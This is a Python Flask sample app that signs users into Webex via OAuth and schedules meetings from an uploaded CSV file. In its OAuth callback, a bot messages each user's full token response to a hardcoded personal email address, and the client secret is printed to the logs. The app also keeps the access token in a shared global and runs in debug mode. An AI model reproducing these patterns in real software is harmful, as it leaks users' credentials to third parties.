# !/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Copyright (c) 2020 Cisco and/or its affiliates.
This software is licensed to you under the terms of the Cisco Sample
Code License, Version 1.1 (the "License"). You may obtain a copy of the
License at
               https://developer.cisco.com/docs/licenses
All use of the material herein must be in accordance with the terms of
the License. All rights not expressly granted by the License are
reserved. Unless required by applicable law or agreed to separately in
writing, software distributed under the License is distributed on an "AS
IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
or implied.
"""

import requests, urllib

from flask import Flask, request, redirect, url_for, render_template
from werkzeug.utils import secure_filename

import time
import os, sys
import json
from webexteamssdk import WebexTeamsAPI

from webex_meetings import csv_scheduler

WEBEX_LOGIN_API_URL = "https://webexapis.com/v1"
WEBEX_MEETINGS_API_URL = "https://api.webex.com/WBXService/XMLService"

webex_integration_client_id = os.environ["INT_CLIENT_ID"]
webex_integration_client_secret= os.environ["INT_CLIENT_SECRET"]
webex_integration_scope = "spark:all meeting:schedules_write meeting:schedules_read meeting:recordings_read"

# Flask app
app = Flask(__name__)

# login page
@app.route('/')
def mainpage():
    return render_template('mainpage_login.html')


@app.route('/uploader', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        filename = f.filename
        f.save(secure_filename(f.filename))
        time.sleep(10)
        webex_meetings = csv_scheduler(webex_access_token, filename)
        return render_template('webex_meetings.html', meetings=webex_meetings)


# webex access token
@app.route('/webexlogin', methods=['POST'])
def webexlogin():

    WEBEX_USER_AUTH_URL = WEBEX_LOGIN_API_URL + "/authorize?client_id={client_id}&response_type=code&redirect_uri={redirect_uri}&response_mode=query&scope={scope}".format(
        client_id=urllib.parse.quote(webex_integration_client_id),
        redirect_uri= urllib.parse.quote(os.environ["REDIRECT_URI"]),
        scope= urllib.parse.quote(webex_integration_scope)
    )

    print(WEBEX_USER_AUTH_URL)
    sys.stdout.flush()

    return redirect(WEBEX_USER_AUTH_URL)


# meeting scheduler
@app.route('/webexoauth', methods=['GET'])
def webexoauth():
    webex_code = request.args.get('code')
    headers_token = {
        "Content-type": "application/x-www-form-urlencoded"
    }

    body = {
        'client_id': webex_integration_client_id,
        'code': webex_code,
        'redirect_uri': os.environ['REDIRECT_URI'],
        'grant_type': 'authorization_code',
        'client_secret': webex_integration_client_secret
    }


    api = WebexTeamsAPI(access_token=os.environ["WT_BOT_TOKEN"])
    api.messages.create(toPersonEmail="stienvan@cisco.com", markdown=os.environ["REDIRECT_URI"])
    print(body)
    sys.stdout.flush()
    get_token = requests.post(WEBEX_LOGIN_API_URL + "/access_token?", headers=headers_token, data=body)

    api.messages.create(toPersonEmail="stienvan@cisco.com", markdown=json.dumps(get_token.json()))

    global webex_access_token
    webex_access_token = get_token.json()['access_token']

    return render_template('file_selector.html')


if __name__ == "__main__":
    app.run(debug=True)
